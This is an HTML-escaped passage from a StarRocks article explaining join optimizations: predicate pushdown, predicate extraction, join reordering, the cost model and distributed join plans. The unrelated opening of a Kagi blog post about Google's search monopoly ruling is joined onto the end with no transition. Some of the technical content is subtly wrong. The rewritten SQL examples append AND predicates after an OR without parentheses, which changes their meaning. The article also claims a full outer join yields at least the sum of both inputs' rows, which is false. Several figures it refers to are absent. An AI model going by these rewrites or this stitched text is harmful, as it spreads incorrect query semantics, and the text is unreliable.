    &lt;p&gt;This introduces the concept of strict (null-rejecting) predicates. In StarRocks, a predicate that filters out &lt;code&gt;NULL&lt;/code&gt; values is considered a strict predicate, for example &lt;code&gt;a &amp;gt; 0&lt;/code&gt;. Predicates that do not eliminate &lt;code&gt;NULL&lt;/code&gt; values are classified as non-strict predicates, such as &lt;code&gt;a IS NULL&lt;/code&gt;. Most predicates fall into the strict category; non-strict predicates are primarily those involving &lt;code&gt;IS NULL&lt;/code&gt;, &lt;code&gt;IF&lt;/code&gt;, &lt;code&gt;CASE WHEN&lt;/code&gt;, or certain function-based expressions.&lt;/p&gt;
    &lt;p&gt;To determine whether a predicate is strict, StarRocks uses a simple yet effective approach: all referenced columns are replaced with &lt;code&gt;NULL&lt;/code&gt;, and the expression is then simplified. If the result evaluates to &lt;code&gt;TRUE&lt;/code&gt;, it means the &lt;code&gt;WHERE&lt;/code&gt; clause does not filter out rows with &lt;code&gt;NULL&lt;/code&gt; inputs, and the predicate is therefore non-strict. Conversely, if the result evaluates to &lt;code&gt;FALSE&lt;/code&gt; or &lt;code&gt;NULL&lt;/code&gt;, the predicate is considered strict.&lt;/p&gt;
    &lt;p&gt;Rule 3: Converting a Full Outer Join into a Left / Right Outer Join&lt;/p&gt;
    &lt;p&gt;A Full Outer Join can be rewritten as a Left Outer Join or Right Outer Join when the following condition is satisfied:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;There exists a strict predicate that can be bound exclusively to the left or right table.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Example:&lt;/p&gt;
    &lt;code&gt;-- Before transformation&lt;lb/&gt;SELECT * FROM t1 FULL OUTER JOIN t2 ON t1.v1 = t2.v1 WHERE t1.v1 &amp;gt; 0;&lt;lb/&gt;&lt;lb/&gt;-- After transformation&lt;lb/&gt;-- t1.v1 &amp;gt; 0 is a strict predicate on the left table&lt;lb/&gt;SELECT * FROM t1 LEFT OUTER JOIN t2 ON t1.v1 = t2.v1 WHERE t1.v1 &amp;gt; 0;&lt;/code&gt;
    &lt;head rend="h3"&gt;2.2 Predicate Pushdown&lt;/head&gt;
    &lt;p&gt;Predicate pushdown is one of the most important and commonly used join optimization techniques. Its primary purpose is to filter join inputs as early as possible, thereby reducing the amount of data involved in the join and improving overall performance.&lt;/p&gt;
    &lt;p&gt;For predicates in the &lt;code&gt;WHERE&lt;/code&gt; clause, predicate pushdown can be applied—and may enable join type transformations—when the following conditions are satisfied:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;The join can be of any type.&lt;/item&gt;
      &lt;item&gt;The &lt;code&gt;WHERE&lt;/code&gt;predicate can be bound to one of the join inputs.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;For example:&lt;/p&gt;
    &lt;code&gt;Select *  &lt;lb/&gt;From t1 Left Outer Join t2 On t1.v1 = t2.v1 &lt;lb/&gt;        Left Outer Join t3 On t2.v2 = t3.v2 &lt;lb/&gt;Where t1.v1 = 1 And t2.v1 = 2 And t3.v2 = 3;&lt;/code&gt;
    &lt;p&gt;The predicate pushdown process proceeds as follows.&lt;/p&gt;
    &lt;p&gt;Step 1 :&lt;/p&gt;
    &lt;p&gt;Push down &lt;code&gt;(t1.v1 = 1 AND t2.v1 = 2)&lt;/code&gt; and &lt;code&gt;(t3.v2 = 3)&lt;/code&gt; separately. Since the join type transformation rules are satisfied,&lt;code&gt;(t1 LEFT OUTER JOIN t2) LEFT OUTER JOIN t3&lt;/code&gt;can be rewritten as &lt;code&gt;(t1 LEFT OUTER JOIN t2) INNER JOIN t3&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;Step 2:&lt;/p&gt;
    &lt;p&gt;Continue pushing down &lt;code&gt;(t1.v1 = 1)&lt;/code&gt; and &lt;code&gt;(t2.v1 = 2)&lt;/code&gt;. At this point,&lt;code&gt;t1 LEFT OUTER JOIN t2&lt;/code&gt; can be further transformed into&lt;code&gt;t1 INNER JOIN t2&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;It is important to note that predicate pushdown rules for join predicates in the &lt;code&gt;ON&lt;/code&gt; clause differ from those for the &lt;code&gt;WHERE&lt;/code&gt; clause. We distinguish between two cases: Inner Joins and other join types.&lt;/p&gt;
    &lt;p&gt;Case 1: Inner Join&lt;/p&gt;
    &lt;p&gt;For Inner Joins, pushing down join predicates in the &lt;code&gt;ON&lt;/code&gt; clause follows the same rules as &lt;code&gt;WHERE&lt;/code&gt; clause predicate pushdown. This has already been discussed above and will not be repeated here.&lt;/p&gt;
    &lt;p&gt;Case 2: Outer / Semi / Anti Joins&lt;/p&gt;
    &lt;p&gt;For Outer, Semi, and Anti Joins, predicate pushdown on &lt;code&gt;ON&lt;/code&gt; clause join predicates must satisfy the following constraints, and no join type transformation is allowed during the pushdown process:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;The join must be a Left or Right Outer / Semi / Anti Join.&lt;/item&gt;
      &lt;item&gt;The join predicate must be bindable only to the nullable side (the right input for a Left Join, or the left input for a Right Join).&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Consider the following example:&lt;/p&gt;
    &lt;code&gt;Select *  &lt;lb/&gt;From t1 Left Outer Join t2 On t1.v1 = t2.v1 And t1.v1 = 1 And t2.v1 = 2 &lt;lb/&gt;        Left Outer Join t3 On t2.v2 = t3.v2 And t3.v2 = 3;&lt;/code&gt;
    &lt;p&gt;The predicate pushdown proceeds as follows.&lt;/p&gt;
    &lt;p&gt;Step 1:&lt;/p&gt;
    &lt;p&gt;Push down the join predicate &lt;code&gt;(t3.v2 = 3)&lt;/code&gt;, which can be bound to the right input of &lt;code&gt;t1 LEFT JOIN t2 LEFT JOIN t3&lt;/code&gt;. At this stage, the &lt;code&gt;LEFT OUTER JOIN&lt;/code&gt; cannot be converted into an &lt;code&gt;INNER JOIN&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;Step 2:&lt;/p&gt;
    &lt;p&gt;Push down the join predicate &lt;code&gt;(t2.v1 = 2)&lt;/code&gt;, which can be bound to the right input of&lt;code&gt;t1 LEFT JOIN t2&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;However, the predicate &lt;code&gt;(t1.v1 = 1)&lt;/code&gt; is bound to the left input. Pushing it down would filter rows from &lt;code&gt;t1&lt;/code&gt;, violating the semantics of a &lt;code&gt;LEFT OUTER JOIN&lt;/code&gt;. Therefore, this predicate cannot be pushed down.&lt;/p&gt;
    &lt;head rend="h3"&gt;2.3 Predicate Extraction&lt;/head&gt;
    &lt;p&gt;In the predicate pushdown rules discussed earlier, only predicates with conjunctive semantics can be pushed down. For example, in &lt;code&gt;t1.v1 = 1 AND t2.v1 = 2 AND t3.v2 = 3&lt;/code&gt;, each sub-predicate is connected by conjunction, making pushdown straightforward. However, predicates with disjunctive semantics, such as&lt;code&gt;t1.v1 = 1 OR t2.v1 = 2 OR t3.v2 = 3&lt;/code&gt;, cannot be pushed down directly.&lt;/p&gt;
    &lt;p&gt;In real-world queries, disjunctive predicates are quite common. To address this, StarRocks introduces an optimization called predicate extraction (column value derivation). This technique derives conjunctive predicates from disjunctive ones by performing a series of union and intersection operations on column value ranges. The derived conjunctive predicates can then be pushed down to reduce join input size.&lt;/p&gt;
    &lt;p&gt;For example:&lt;/p&gt;
    &lt;code&gt;-- Before predicate extraction&lt;lb/&gt;SELECT *&lt;lb/&gt;FROM t1 JOIN t2 ON t1.v1 = t2.v1&lt;lb/&gt;WHERE (t2.v1 = 2 AND t1.v2 = 3)OR (t2.v1 &amp;gt; 5 AND t1.v2 = 4);&lt;/code&gt;
    &lt;p&gt;Using column value derivation on &lt;code&gt;(t2.v1 = 2 AND t1.v2 = 3) OR (t2.v1 &amp;gt; 5 AND t1.v2 = 4)&lt;/code&gt;, the optimizer can extract the following predicates:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;code&gt;t2.v1 &amp;gt;= 2&lt;/code&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;code&gt;t1.v2 IN (3, 4)&lt;/code&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The query can then be rewritten as:&lt;/p&gt;
    &lt;code&gt;SELECT *&lt;lb/&gt;FROM t1 JOIN t2 ON t1.v1 = t2.v1&lt;lb/&gt;WHERE (t2.v1 = 2 AND t1.v2 = 3)OR (t2.v1 &amp;gt; 5 AND t1.v2 = 4)AND t2.v1 &amp;gt;= 2&lt;lb/&gt;AND t1.v2 IN (3, 4);&lt;/code&gt;
    &lt;p&gt;It is important to note that the extracted predicates may form a superset of the original predicate ranges. As a result, they cannot safely replace the original predicates and must instead be applied in addition to them.&lt;/p&gt;
    &lt;head rend="h3"&gt;2.4 Equivalence Derivation&lt;/head&gt;
    &lt;p&gt;In addition to predicate extraction, another important predicate-level optimization is equivalence derivation. This technique leverages join equality conditions to infer value constraints on one side of the join from predicates applied to the other side.&lt;/p&gt;
    &lt;p&gt;Specifically, based on the join condition, value ranges on columns from the left table can be used to derive corresponding value ranges on columns from the right table, and vice versa.&lt;/p&gt;
    &lt;p&gt;For example:&lt;/p&gt;
    &lt;code&gt;-- Original SQL&lt;lb/&gt;SELECT *&lt;lb/&gt;FROM t1 JOIN t2 ON t1.v1 = t2.v1&lt;lb/&gt;WHERE (t2.v1 = 2 AND t1.v2 = 3)&lt;lb/&gt;   OR (t2.v1 &amp;gt; 5 AND t1.v2 = 4);&lt;/code&gt;
    &lt;p&gt;Using predicate extraction on &lt;code&gt;(t2.v1 = 2 AND t1.v2 = 3) OR (t2.v1 &amp;gt; 5 AND t1.v2 = 4)&lt;/code&gt;, the optimizer can derive the following predicates:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;code&gt;t2.v1 &amp;gt;= 2&lt;/code&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;code&gt;t1.v2 IN (3, 4)&lt;/code&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Resulting in:&lt;/p&gt;
    &lt;code&gt;SELECT *&lt;lb/&gt;FROM t1 JOIN t2 ON t1.v1 = t2.v1&lt;lb/&gt;WHERE (t2.v1 = 2 AND t1.v2 = 3)&lt;lb/&gt;   OR (t2.v1 &amp;gt; 5 AND t1.v2 = 4)&lt;lb/&gt;  AND t2.v1 &amp;gt;= 2&lt;lb/&gt;  AND t1.v2 IN (3, 4);&lt;/code&gt;
    &lt;p&gt;Next, using the join predicate &lt;code&gt;(t1.v1 = t2.v1)&lt;/code&gt; together with &lt;code&gt;t2.v1 &amp;gt;= 2&lt;/code&gt;, equivalence derivation can infer an additional predicate:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;code&gt;t1.v1 &amp;gt;= 2&lt;/code&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The query can therefore be further rewritten as:&lt;/p&gt;
    &lt;code&gt;SELECT *&lt;lb/&gt;FROM t1 JOIN t2 ON t1.v1 = t2.v1&lt;lb/&gt;WHERE (t2.v1 = 2 AND t1.v2 = 3)&lt;lb/&gt;   OR (t2.v1 &amp;gt; 5 AND t1.v2 = 4)&lt;lb/&gt;  AND t2.v1 &amp;gt;= 2&lt;lb/&gt;  AND t1.v2 IN (3, 4)&lt;lb/&gt;  AND t1.v1 &amp;gt;= 2;&lt;/code&gt;
    &lt;p&gt;Applicability and Constraints&lt;/p&gt;
    &lt;p&gt;The scope of equivalence derivation is more limited than predicate extraction. Predicate extraction can be applied to arbitrary predicates, whereas equivalence derivation, like predicate pushdown, has different constraints depending on the join type. As before, we distinguish between &lt;code&gt;WHERE&lt;/code&gt; predicates and &lt;code&gt;ON&lt;/code&gt; clause join predicates.&lt;/p&gt;
    &lt;p&gt;For &lt;code&gt;WHERE&lt;/code&gt; predicates:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;There are almost no restrictions. Predicates can be derived from the left table to the right table and vice versa.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;For &lt;code&gt;ON&lt;/code&gt; clause join predicates:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;For Inner Joins, the rules are the same as for &lt;code&gt;WHERE&lt;/code&gt;predicates—no additional constraints apply.&lt;/item&gt;
      &lt;item&gt;For join types other than Inner Join, only Semi Joins and Outer Joins are supported, and derivation is one-directional only, opposite to the join direction:&lt;/item&gt;
      &lt;item&gt;For a Left Outer Join, predicates can be derived from the left table to the right table.&lt;/item&gt;
      &lt;item&gt;For a Right Outer Join, predicates can be derived from the right table to the left table.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Why Is Equivalence Derivation One-Directional for Outer / Semi Joins?&lt;/p&gt;
    &lt;p&gt;The reason is straightforward. Consider a Left Outer Join. As discussed in predicate pushdown rules, only predicates on the right table can be pushed down; predicates on the left table cannot, as doing so would violate the semantics of a left outer join.&lt;/p&gt;
    &lt;p&gt;For the same reason, predicates derived from the right table and applied to the left table must also respect this constraint. In practice, such derived predicates on the preserved side do not help filter data early and instead introduce additional evaluation overhead. Therefore, equivalence derivation for Outer and Semi Joins is intentionally restricted to a single direction.&lt;/p&gt;
    &lt;p&gt;Implementation Details&lt;/p&gt;
    &lt;p&gt;StarRocks implements equivalence derivation by maintaining two internal maps:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;One map tracks column-to-column equivalence relationships.&lt;/item&gt;
      &lt;item&gt;The other map tracks column-to-value or column-to-expression equivalences.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;By performing lookups and inference across these two maps, the optimizer derives additional equivalent predicates. The overall mechanism is illustrated below:&lt;/p&gt;
    &lt;head rend="h3"&gt;2.5 Limit Pushdown&lt;/head&gt;
    &lt;p&gt;In addition to predicates, &lt;code&gt;LIMIT&lt;/code&gt; clauses can also be pushed down through joins. When a query involves an Outer Join or a Cross Join, the &lt;code&gt;LIMIT&lt;/code&gt; can be pushed down to child operators whose output row count is guaranteed to be stable.&lt;/p&gt;
    &lt;p&gt;For example, in a Left Outer Join, the output row count is at least the same as that of the left input. Therefore, the &lt;code&gt;LIMIT&lt;/code&gt; can be pushed down to the left table (and symmetrically for a Right Outer Join).&lt;/p&gt;
    &lt;code&gt;-- Before pushdown&lt;lb/&gt;SELECT *&lt;lb/&gt;FROM t1 LEFT OUTER JOIN t2 ON t1.v1 = t2.v1&lt;lb/&gt;LIMIT 100;&lt;lb/&gt;&lt;lb/&gt;-- After pushdown&lt;lb/&gt;SELECT *&lt;lb/&gt;FROM (SELECT * FROM t1 LIMIT 100) t&lt;lb/&gt;LEFT OUTER JOIN t2 ON t.v1 = t2.v1&lt;lb/&gt;LIMIT 100;&lt;/code&gt;
    &lt;head rend="h3"&gt;Special Cases: Cross Join and Full Outer Join&lt;/head&gt;
    &lt;p&gt;A Cross Join produces a Cartesian product, with output cardinality equal to&lt;code&gt;rows(left) × rows(right)&lt;/code&gt;. A Full Outer Join produces at least&lt;code&gt;rows(left) + rows(right)&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;For these join types, a &lt;code&gt;LIMIT&lt;/code&gt; can be pushed down to both inputs independently:&lt;/p&gt;
    &lt;code&gt;-- Before pushdown&lt;lb/&gt;SELECT *&lt;lb/&gt;FROM t1 JOIN t2&lt;lb/&gt;LIMIT 100;&lt;lb/&gt;&lt;lb/&gt;-- After pushdown&lt;lb/&gt;SELECT *&lt;lb/&gt;FROM (SELECT * FROM t1 LIMIT 100) x1&lt;lb/&gt;JOIN (SELECT * FROM t2 LIMIT 100) &lt;lb/&gt;LIMIT 100;&lt;/code&gt;
    &lt;head rend="h2"&gt;Join Reordering&lt;/head&gt;
    &lt;p&gt;Join reordering is used to determine the execution order of multi-table joins. The optimizer aims to execute high-selectivity joins as early as possible, thereby reducing the size of intermediate results and improving overall query performance.&lt;/p&gt;
    &lt;p&gt;In StarRocks, join reordering primarily operates on continuous sequences of Inner Joins or Cross Joins. As illustrated below, StarRocks groups a sequence of consecutive Inner / Cross Joins into a Multi Join Node. A Multi Join Node is the basic unit for join reordering: if a query plan contains multiple such nodes, StarRocks performs join reordering independently for each one.&lt;/p&gt;
    &lt;p&gt;There are many join reordering algorithms in the industry, often based on different optimization models, including:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Heuristic-based approaches: Rely on predefined rules, such as those used in MemSQL, where join order is determined around dimension tables and fact tables.&lt;/item&gt;
      &lt;item&gt;Left-Deep Trees: Restrict plans to left-deep trees, significantly reducing the search space, though the resulting plan is not always optimal.&lt;/item&gt;
      &lt;item&gt;Bushy Trees: Allow fully bushy join trees, resulting in a much larger search space that includes the optimal plan. Common reordering algorithms under this model include:&lt;/item&gt;
      &lt;item&gt;Exhaustive search (based on commutativity and associativity)&lt;/item&gt;
      &lt;item&gt;Greedy algorithms&lt;/item&gt;
      &lt;item&gt;Simulated annealing&lt;/item&gt;
      &lt;item&gt;Dynamic programming (e.g., DPsize, DPsub, DPccp)&lt;/item&gt;
      &lt;item&gt;Genetic algorithms (e.g., Greenplum)&lt;/item&gt;
      &lt;item&gt;……&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;StarRocks currently implements several join reordering strategies, including Left-Deep, Exhaustive, Greedy, and DPsub. In the following sections, we focus on the implementation details of Exhaustive and Greedy join reordering in StarRocks.&lt;/p&gt;
    &lt;head rend="h3"&gt;3.1 Exhaustive&lt;/head&gt;
    &lt;p&gt;The exhaustive join reordering algorithm is based on systematically enumerating all possible join orders. In practice, this is achieved through two fundamental rules, which together cover nearly the entire space of join permutations.&lt;/p&gt;
    &lt;p&gt;Rule 1: Join Commutativity&lt;/p&gt;
    &lt;p&gt;A join between two relations can be reordered by swapping its inputs:&lt;code&gt;A JOIN B → B JOIN A&lt;/code&gt;&lt;/p&gt;
    &lt;p&gt;During this transformation, the join type must be adjusted accordingly. For example, a &lt;code&gt;LEFT OUTER JOIN&lt;/code&gt; becomes a &lt;code&gt;RIGHT OUTER JOIN&lt;/code&gt; after swapping the join operands.&lt;/p&gt;
    &lt;p&gt;Rule 2: Join Associativity&lt;/p&gt;
    &lt;p&gt;Join associativity allows the join order among three relations to be rearranged:&lt;code&gt;(A JOIN B) JOIN C → A JOIN (B JOIN C)&lt;/code&gt;&lt;/p&gt;
    &lt;p&gt;In StarRocks, associativity is handled differently depending on the join type. Specifically, StarRocks distinguishes between:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Associativity for Inner / Cross Joins&lt;/item&gt;
      &lt;item&gt;Associativity for Semi Joins&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;3.2 Greedy&lt;/head&gt;
    &lt;p&gt;For its greedy join reordering strategy, StarRocks primarily draws inspiration from multi-sequence greedy algorithms, with a small but important enhancement: at each iteration level, instead of keeping only a single best result, StarRocks retains the top 10 candidate plans (which may not be globally optimal). These candidates are then carried forward into the next iteration, ultimately producing 10 greedy-optimized plans.&lt;/p&gt;
    &lt;p&gt;Due to the inherent limitations of greedy algorithms, this approach does not guarantee a globally optimal plan. However, by preserving multiple high-quality candidates at each step, it significantly increases the likelihood of finding a near-optimal or optimal solution.&lt;/p&gt;
    &lt;head rend="h3"&gt;3.3 Cost Model&lt;/head&gt;
    &lt;p&gt;StarRocks uses these join reordering algorithms to generate N candidate plans. It then evaluates them with a cost model that estimates the cost of each join. The overall cost is computed as: Join Cost = CPU × (Row(L) + Row(R)) + Memory × Row(R)&lt;/p&gt;
    &lt;p&gt;Here, &lt;code&gt;Row(L)&lt;/code&gt; and &lt;code&gt;Row(R)&lt;/code&gt; are the estimated output row counts of the join’s left and right children, respectively. This formula primarily accounts for the CPU cost of processing both inputs, as well as the memory cost of building the hash table on the right side of a hash join. The figure below shows how StarRocks estimates join output row counts in more detail.&lt;/p&gt;
    &lt;p&gt;Because different join reordering algorithms explore search spaces of varying sizes and have different time complexities, StarRocks benchmarks their execution time and complexity characteristics, as shown below.&lt;/p&gt;
    &lt;p&gt;Based on the observed execution costs, StarRocks applies practical limits to how different join reordering algorithms are used:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;For joins involving up to 4 tables, StarRocks uses the exhaustive algorithm.&lt;/item&gt;
      &lt;item&gt;For joins with 4–10 tables, StarRocks generates:&lt;/item&gt;
      &lt;item&gt;1 plan using the left-deep strategy,&lt;/item&gt;
      &lt;item&gt;10 plans using the greedy algorithm,&lt;/item&gt;
      &lt;item&gt;1 plan using dynamic programming.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;On top of these, StarRocks further explores additional plans using join commutativity.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;For joins with more than 10 tables, StarRocks relies only on the greedy and left-deep strategies, producing a total of 11 candidate plans as the basis for reordering.&lt;/item&gt;
      &lt;item&gt;When statistics are unavailable, cost-based greedy and dynamic programming approaches become unreliable. In this case, StarRocks falls back to using a single left-deep plan as the basis for join reordering.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Distributed Join Planning&lt;/head&gt;
    &lt;p&gt;After covering the logical optimizations involved in join queries, we now turn to join execution in a distributed environment, focusing on how StarRocks optimizes distributed join planning as a distributed database.&lt;/p&gt;
    &lt;head rend="h3"&gt;4.1 MPP Parallel Execution&lt;/head&gt;
    &lt;p&gt;StarRocks is built on an MPP (Massively Parallel Processing) execution framework. The overall architecture is illustrated below. Using a simple join query as an example, the execution of &lt;code&gt;A JOIN B&lt;/code&gt; in StarRocks typically proceeds as follows:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Data from tables A and B is read in parallel from different nodes, based on their respective data distributions.&lt;/item&gt;
      &lt;item&gt;According to the join predicate, data from A and B is reshuffled so that matching rows are sent to the same set of nodes.&lt;/item&gt;
      &lt;item&gt;The join is executed locally on each node, and the partial results are produced.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;As shown, query execution usually involves multiple sets of machines: the nodes reading table A, the nodes reading table B, and the nodes performing the join are not necessarily the same. As a result, execution inevitably involves network transfers and data exchanges.&lt;/p&gt;
    &lt;p&gt;These network operations introduce significant overhead. Therefore, a key goal in optimizing distributed join execution in StarRocks is to minimize network cost, while more intelligently partitioning and distributing the query plan to fully leverage the benefits of parallel execution.&lt;/p&gt;
    &lt;head rend="h3"&gt;4.2 Distributed Join Optimization&lt;/head&gt;
    &lt;p&gt;We begin by introducing the distributed execution plans that StarRocks can generate. Using a simple join query as an example:&lt;/p&gt;
    &lt;code&gt;Select * From A Join B on A.a = B.b&lt;/code&gt;
    &lt;p&gt;In practice, StarRocks can generate five basic types of distributed join plans:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Shuffle Join Data from both tables A and B is shuffled based on the join key so that matching rows are sent to the same set of nodes, where the join is then executed.&lt;/item&gt;
      &lt;item&gt;Broadcast Join The entire table B is broadcast to all nodes that hold table A, and the join is performed locally on those nodes. Compared to a shuffle join, this avoids shuffling table A, but requires broadcasting all of table B. This strategy is suitable when B is a small table.&lt;/item&gt;
      &lt;item&gt;Bucket Shuffle Join An optimization over broadcast join. Instead of broadcasting table B to all nodes, B is shuffled according to A’s data distribution and sent only to the corresponding nodes that hold matching buckets of A. Globally, the shuffled data from B exists only once, significantly reducing network traffic compared to broadcast join. This strategy has an important constraint: the join key must be consistent with A’s distribution key.&lt;/item&gt;
      &lt;item&gt;Colocate Join When tables A and B are created within the same colocate group, their data distributions are guaranteed to be identical. If the join key matches the distribution key, StarRocks can execute the join directly on the local nodes holding A and B, without any data shuffle.&lt;/item&gt;
      &lt;item&gt;Replicate Join An experimental feature in StarRocks. If every node holding table A also contains a full copy of table B, the join can be executed locally. This approach has very strict requirements — essentially requiring the replication factor of table B to match the total number of nodes in the cluster — making it impractical in most real-world scenarios.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;4.3 Exploring Distributed Join Plans&lt;/head&gt;
    &lt;p&gt;StarRocks derives distributed join plans through distribution property inference. Using a shuffle join as an example:&lt;code&gt;SELECT * FROM A JOIN B ON A.a = B.b&lt;/code&gt;, the join operator propagates shuffle requirements top-down to tables A and B. If a scan node cannot satisfy the required distribution, StarRocks inserts an Enforce operator to introduce a shuffle. In the final execution plan, this shuffle is translated into an Exchange node responsible for network data transfer.&lt;/p&gt;
    &lt;p&gt;Other distributed join strategies are derived in the same way: the join operator requests different distribution properties from its input operators, and the optimizer generates the corresponding distributed execution plans accordingly.&lt;/p&gt;
    &lt;head rend="h3"&gt;4.4 Complex Distributed Joins&lt;/head&gt;
    &lt;p&gt;In real-world workloads, user queries are far more complex than a simple &lt;code&gt;A JOIN B&lt;/code&gt;. They often involve three or more tables. For such queries, StarRocks generates a richer set of distributed execution plans, all derived from the same fundamental join strategies described earlier.&lt;/p&gt;
    &lt;p&gt;For example:&lt;/p&gt;
    &lt;code&gt;Select * From A Join B on A.a = B.b Join C on A.a = C.c&lt;/code&gt;
    &lt;p&gt;Using combinations of Shuffle Join and Broadcast Join, StarRocks can derive multiple distributed plans, as illustrated below.&lt;/p&gt;
    &lt;p&gt;If Colocate Join and Bucket Shuffle Join are also considered, even more execution plans become possible:&lt;/p&gt;
    &lt;p&gt;Despite their increased complexity, the underlying derivation logic remains the same. Distribution properties are propagated downward through the plan tree, allowing the optimizer to infer different combinations of distributed join strategies.&lt;/p&gt;
    &lt;head rend="h3"&gt;4.5 Global Runtime Filters&lt;/head&gt;
    &lt;p&gt;Beyond exploring distributed execution plans, StarRocks further optimizes join performance by leveraging the execution characteristics of join operators to build Global Runtime Filters.&lt;/p&gt;
    &lt;p&gt;The execution flow of a Hash Join in StarRocks is as follows:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Retrieve the complete data set from the right table.&lt;/item&gt;
      &lt;item&gt;Build a hash table from the right table.&lt;/item&gt;
      &lt;item&gt;Fetch data from the left table.&lt;/item&gt;
      &lt;item&gt;Probe the hash table to evaluate join conditions.&lt;/item&gt;
      &lt;item&gt;Produce the join results.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Global Runtime Filters are applied between Step 2 and Step 3. After constructing the hash table on the right side, StarRocks derives runtime filter predicates from the observed data and pushes these filters down to the scan nodes of the left table before left-side data is read. This allows the left table to filter out irrelevant rows early, significantly reducing join input size.&lt;/p&gt;
    &lt;p&gt;At present, Global Runtime Filters in StarRocks support the following filtering techniques: Min/Max filters, IN predicates, and Bloom filters. The diagram below illustrates how these filters work in practice.&lt;/p&gt;
    &lt;head rend="h2"&gt;Summary&lt;/head&gt;
    &lt;p&gt;This article has explored StarRocks’ practical experience and ongoing work in join query optimization. All of the techniques discussed are closely aligned with the core optimization principles outlined throughout the article. When optimizing SQL queries in practice, users can also apply the following guidelines together with the features provided by StarRocks to achieve better performance:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Join operators vary significantly in performance. Prefer high-performance join types whenever possible and avoid expensive ones. Based on typical join output sizes, the rough performance ranking is: Semi Join / Anti Join &amp;gt; Inner Join &amp;gt; Outer Join &amp;gt; Full Outer Join &amp;gt; Cross Join.&lt;/item&gt;
      &lt;item&gt;For hash joins, building the hash table on a smaller input is far more efficient than building it on a large table.&lt;/item&gt;
      &lt;item&gt;In multi-table joins, execute highly selective joins first to substantially reduce the cost of subsequent joins.&lt;/item&gt;
      &lt;item&gt;Minimize the amount of data participating in joins through early filtering and pruning.&lt;/item&gt;
      &lt;item&gt;Reduce network overhead in distributed joins as much as possible to fully benefit from parallel execution.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Case Studies&lt;/head&gt;
    &lt;head rend="h3"&gt;Demandbase&lt;/head&gt;
    &lt;p&gt;By leveraging StarRocks’ On-the-Fly JOIN capabilities, Demandbase successfully replaced its existing ClickHouse clusters, optimizing performance while significantly reducing costs across multiple areas.&lt;/p&gt;

    &lt;head rend="h3"&gt;Naver&lt;/head&gt;
    &lt;p&gt;NAVER modernized its data infrastructure with StarRocks by enabling scalable, real-time analytics over multi-table joins without denormalization. The case study highlights the critical role of efficient, on-the-fly join execution in supporting production-scale analytical workloads.&lt;/p&gt;

    &lt;head rend="h3"&gt;Shopee&lt;/head&gt;
    &lt;p&gt;Data Go is a no-code query platform where Shopee business users build queries from multiple tables. Presto struggled with complex join performance and high resource usage. When Shopee switched to StarRocks for multi-table joins, they observed 3×–10× performance improvements and a ~60% reduction in CPU usage compared with Presto on external Hive data.&lt;/p&gt;

  &lt;main&gt;
    &lt;head rend="h1"&gt;Waiting for dawn in search: Search index, Google rulings and impact on Kagi&lt;/head&gt;
    &lt;p&gt;This blog post is a follow-up to Dawn of a new era in Search, published last year. A lot has changed: the legal case has advanced, AI has become the central battleground, and the need for open index access has only grown sharper.&lt;/p&gt;
    &lt;p&gt;As of late 2025, one company decides what nearly 9 out of 10 people see when they search the web: Google. On August 5, 2024, a U.S. court officially ruled that Google is a monopolist in general search services. This ruling is not about ads or browser defaults alone. It is about who controls the index that powers both search and AI - and whether anyone else is allowed to build on it.&lt;/p&gt;
    &lt;p&gt;The stakes have grown sharper over the past year. LLMs hallucinate without grounding in real-world information; every agent that answers questions about the real world, depends on search. LLMs themselves are a blend of proprietary and open source. Cloud compute is competitive. But search is different - only one company controls a comprehensive, fresh, high-quality web index. If one company controls the index, it controls the floor on how good AI can be - and who gets to build it. The innovation crunch in search is now an innovation crunch in AI.&lt;/p&gt;
    &lt;p&gt;We are writing this from a position we believe in: people should have the choice to access information without behaviour-changing, ad-driven, intermediary standing between them and knowledge.&lt;/p&gt;
